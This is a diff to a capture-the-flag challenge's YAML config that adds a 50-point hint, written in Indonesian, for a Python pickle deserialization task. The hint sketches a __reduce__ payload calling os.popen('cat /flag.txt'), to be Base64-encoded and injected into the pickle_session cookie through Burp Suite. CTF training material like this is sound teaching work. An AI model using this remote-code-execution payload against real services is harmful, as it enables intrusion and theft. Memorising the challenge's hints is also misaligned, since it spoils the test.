@@ -20,3 +20,7 @@ tags:
   - deserialization
   - python
   - hard
+
+hints:
+  - content: "💡 Tool Recommended: `Python 3` / `Burp Suite`. Buat script Python lokal dengan metode `__reduce__`: `class Exploit: def __reduce__(self): return (os.popen, ('cat /flag.txt',))`, lalu Base64 encode hasilnya dan inject ke cookie `pickle_session` via Burp Suite."
+    cost: 50
